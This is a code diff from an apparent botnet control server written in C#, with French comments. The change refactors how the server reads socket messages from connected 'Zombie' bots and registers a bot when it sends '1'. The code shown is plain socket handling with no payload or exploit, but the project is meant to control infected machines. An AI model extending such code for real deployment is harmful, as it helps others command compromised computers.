@@ -53,6 +53,28 @@ namespace BotnetAPP.Network {
         _checkingBotDisconnection.Start() ; 
 
     }
+
+    /*
+
+    Ecriture et lecture des messages  envoyés et reçu par l'un des clients
+
+    */
+    
+    private string GetIncomingMessage(Socket s) {
+              byte[] rawMessage = new byte[1024];
+              string resultat  = "";
+              int k = s.Receive(rawMessage);
+               for (int i = 0; i < k; i++) {
+                resultat += Convert.ToChar(rawMessage[i]);
+               }
+                return resultat ; 
+        }
+    
+    private void WriteNetMessage (Socket s) {
+        // A écrire pour simplifier le processus de communication
+    }
+
+    
         
     private bool SocketConnected(Socket s)
     {
@@ -64,10 +86,6 @@ namespace BotnetAPP.Network {
         
 
         while (true) {
-
-
-            /*
-            génère une exception : Collection was modified */
 
             List<Zombie> ZombieLost = new() ; 
 
@@ -118,20 +136,13 @@ namespace BotnetAPP.Network {
                 try {
                     Console.WriteLine("Connexion ouverte " + s.RemoteEndPoint);
 
-                    byte[] rawMessage = new byte[1024];
-                    string message = "";
-                    int k = s.Receive(rawMessage);
-
-                    for (int i = 0; i < k; i++)
-                        message += Convert.ToChar(rawMessage[i]);
 
 
                     /* 
                     Pour l'instant je laisse comme ça
                     Plus tard je mettrais un vrai système de contrôle de connexion
-
                     */ 
-                    if ( message == "1" ) {
+                    if ( GetIncomingMessage(s) == "1" ) {
                         _connectedBot.Add(new Zombie(), s) ;
                     }
 
